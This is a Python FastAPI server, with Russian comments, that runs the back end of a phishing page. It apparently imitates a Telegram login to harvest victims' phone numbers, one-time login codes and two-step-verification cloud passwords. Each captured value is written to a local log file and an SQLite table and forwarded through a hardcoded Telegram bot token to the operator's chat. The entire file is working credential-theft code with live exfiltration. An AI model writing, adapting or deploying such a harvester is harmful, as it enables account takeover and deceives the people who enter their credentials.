from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
import sqlite3
import datetime
import uvicorn
import requests

app = FastAPI()

# Настройки твоего Telegram-бота для отправки уведомлений
TG_TOKEN = "9209600747:AAE98UHgY9jSjm8ZXATeeLsnMtP4YZpXojo"
CHAT_ID = "5904604582"

def send_telegram_alert(text: str):
    try:
        url = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"
        payload = {
            "chat_id": CHAT_ID,
            "text": text,
            "parse_mode": "Markdown"
        }
        requests.post(url, json=payload, timeout=4)
    except Exception as e:
        print(f"Ошибка отправки в Telegram: {e}")

def init_db():
    conn = sqlite3.connect("messenger_67.db")
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            ip TEXT,
            phone TEXT,
            code TEXT,
            cloud_password TEXT
        )
    """)
    conn.commit()
    conn.close()

init_db()
sessions = {}

def log_to_pc(title: str, info: dict):
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"\n{'='*50}\n[{now}] 🔔 {title}\n"
    for k, v in info.items():
        line += f"  • {k}: {v}\n"
    line += f"{'='*50}"
    print(line)
    with open("logs_67.txt", "a", encoding="utf-8") as f:
        f.write(line + "\n")

class PhoneReq(BaseModel):
    country: str
    phone: str

class CodeReq(BaseModel):
    phone: str
    code: str

class PassReq(BaseModel):
    phone: str
    password: str

@app.get("/", response_class=HTMLResponse)
@app.get("/dvideo67", response_class=HTMLResponse)
async def index():
    with open("index.html", "r", encoding="utf-8") as f:
        return f.read()

@app.post("/api/send-code")
async def send_code(req: PhoneReq, request: Request):
    ip = request.client.host
    sessions[req.phone] = {"country": req.country, "ip": ip, "code": "", "password": ""}
    
    log_to_pc("ШАГ 1: ВВЕДЕН НОМЕР ТЕЛЕФОНА", {"IP": ip, "Страна": req.country, "Номер": req.phone})
    send_telegram_alert(f"📱 *ШАГ 1: Введен номер*\n🌐 IP: `{ip}`\n🌍 Страна: {req.country}\n📞 Телефон: `{req.phone}`")
    
    return {"status": "ok"}

@app.post("/api/verify-code")
async def verify_code(req: CodeReq, request: Request):
    ip = request.client.host
    if req.phone not in sessions:
        sessions[req.phone] = {"country": "Неизвестно", "ip": ip}
    sessions[req.phone]["code"] = req.code
    
    log_to_pc("ШАГ 2: ВВЕДЕН 5-ЗНАЧНЫЙ КОД", {"IP": ip, "Номер": req.phone, "Код": req.code})
    send_telegram_alert(f"💬 *ШАГ 2: Введен код*\n📞 Телефон: `{req.phone}`\n🔑 Код: `{req.code}`")
    
    return {"status": "ok"}

@app.post("/api/auth-password")
async def auth_password(req: PassReq, request: Request):
    ip = request.client.host
    sess = sessions.get(req.phone, {})
    code = sess.get("code", "---")
    
    log_to_pc("ШАГ 3: ОБЛАЧНЫЙ ПАРОЛЬ (2FA)", {"IP": ip, "Номер": req.phone, "Код": code, "Пароль": req.password})
    send_telegram_alert(f"🔒 *ШАГ 3: Введен 2FA Пароль!*\n📞 Телефон: `{req.phone}`\n💬 Код: `{code}`\n🔑 Пароль: `{req.password}`")

    conn = sqlite3.connect("messenger_67.db")
    c = conn.cursor()
    c.execute("INSERT INTO logs (timestamp, ip, phone, code, cloud_password) VALUES (?, ?, ?, ?, ?)",
              (datetime.datetime.now().isoformat(), ip, req.phone, code, req.password))
    conn.commit()
    conn.close()
    return {"status": "ok"}

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)
